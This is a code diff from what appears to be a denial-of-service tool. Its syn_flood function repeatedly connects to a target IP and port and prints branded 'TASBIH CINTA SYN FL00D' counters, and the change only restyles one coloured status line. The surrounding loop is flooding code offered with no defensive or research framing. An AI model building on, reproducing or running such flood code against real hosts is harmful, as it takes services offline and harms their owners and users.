@@ -121,7 +121,7 @@ def syn_flood(ip, port, duration):
             sock.connect((ip, port))
             sent += 1
             print(f"\033[31m[]  \033[32m TASBIH CINTA  \033[100m\033[33mSYN FL00D\033[0m  \033[104m\033[97m{sent}\033[0m  \033[38;5;206m{ip}\033[0m")
-            print(f"\033[97m[]  \033[38;5;39m TASBIH CINTA  \033[38;5;206mSYN FL00D\033[0m  \033[97m{sent}\033[0m  \033[103m\033[32m{ip}\033[0m")
+            print(f"\033[97m[]  \033[103m\033[38;5;39m TASBIH CINTA\033[0m  \033[38;5;206mSYN FL00D\033[0m  \033[97m{sent}\033[0m  \033[103m\033[32m{ip}\033[0m")
             sock.close()
         except OSError:
             pass
